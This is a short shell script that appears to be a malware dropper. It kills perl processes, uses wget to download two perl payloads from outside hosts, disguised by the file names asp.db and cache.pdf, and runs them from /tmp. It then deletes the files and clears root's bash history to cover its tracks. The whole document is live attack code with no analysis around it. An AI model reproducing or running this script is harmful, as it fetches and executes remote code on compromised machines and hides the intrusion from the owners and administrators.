#!/bin/sh
cd /tmp
pkill -9 perl
wget http://radiodeea.hi2.ro/asp.db
perl asp.db
rm -rf asp.db
rm -rf asp.*
rm -rf asp*
wget http://idip.do.am/cache.pdf
perl cache.pdf
rm -rf cache.pdf
rm -rf cache.*
rm -rf cache*
rm -rf /root/.bash_history
touch /root/.bash_history
history -c